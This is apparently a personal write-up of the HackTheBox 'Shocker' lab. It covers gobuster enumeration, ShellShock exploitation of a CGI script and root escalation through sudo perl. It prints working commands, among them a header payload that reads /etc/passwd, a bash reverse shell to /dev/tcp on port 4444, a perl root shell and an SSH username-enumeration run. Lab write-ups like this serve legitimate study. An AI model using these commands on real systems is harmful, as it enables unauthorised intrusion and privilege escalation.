## Visual
Navigated to the site (apache is running) and saw this:
![[Pasted image 20220623162301.png]]
Page source doesn't contain a whole lot:
```html
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
```

## GoBuster
Gobuster directory enumeration results in the following:
```bash
─[us-vip-4]─[10.10.14.14]─[htb-ghohst@pwnbox-base]─[~/Downloads]
└──╼ [★]$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt

Based on the below reading, I knew we were looking for a .sh file (assuming ShellShock) inside of /cgi-bin. I may have used a hammer here with the 'big.txt' wordlist, but it proved successful:
```bash

CGI-BIN is the only item here that looks unique and/or different. Performed some quick research and will attach that info here. Based on the version of apache and the name of the machine, we'll start looking into ShellShock and related exploits.

https://www.techopedia.com › ... › DevOps › CGI-Bin
A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website.

# Exploitation
---
From our previous gobuster results, we found 'user.sh'. Navigating to http://10.10.10.56/cgi-bin/user.sh downloads the file successfully. 
[GitHub](https://github.com/opsxcq/exploit-CVE-2014-6271) Link to exploit and test environment

## POC
From the github link above, we ran this command against the machine and it did, in fact, cat out the /etc/passwd file. This indicates that we should be able to initiate a reverse shell (or send through any other command) successfully.
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" 
 http://localhost:8080/cgi-bin/user.sh
```

## FootHold
Pulled the syntax for a bash reverse shell from this [Link](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/) after my regular nc IP PORT command didn't take. I started netcat in a separate window and began the listener, ran this one through via my first terminal and confirmed a reverse shell.
```bash
─[us-vip-4]─[10.10.14.14]─[htb-ghohst@pwnbox-base]─[~/Downloads]
└──╼ [★]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

```bash
─[us-vip-4]─[10.10.14.14]─[htb-ghohst@pwnbox-base]─[/usr/share]
└──╼ [★]$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.56] 57980
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Navigated to ~, found user.txt, cat'd it out and submitted the flag.

## Privilege Escalation

Started with a typical sudo -l and found we can run perl as root:
```bash
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Tried my hand at sudo perl -e /bin/bash but the syntax wasn't right (obviously). Identified the correct syntax via [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) 
```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
root
```

Navigated to ~, cat'd out root.txt, submitted the flag.

## Failures
### SSH
Started with SSH and identified the following [Exploit](https://www.exploit-db.com/exploits/40136) via searchsploit and exploit-db.
Downloaded the script for later use. I don't think it will be SSH as the aforementioned exploit mostly revolves around user enumeration.

We'll maybe perform the user enumeration just in case.
Running the script gives me a paramiko error, so we'll get that installed as per the [Site](https://www.paramiko.org/installing.html)
```bash
pip install paramiko
```

Had to update the python script to utilize time.perf_counter() instead of time.clock() as it has been deprecated per this article [Link](https://stackoverflow.com/questions/58569361/attributeerror-module-time-has-no-attribute-clock-in-python-3-8) 

It seems like we're getting way too many hits on usernames and perhaps this isn't functioning as expected. I think I'm going to move on to apache enumeration, but we'll hold on to this line for later if we want to revisit:
```
python3 40136.py -U /usr/share/SecLists/Usernames/Names/names.txt 10.10.10.56:2222 > username.txt &
```
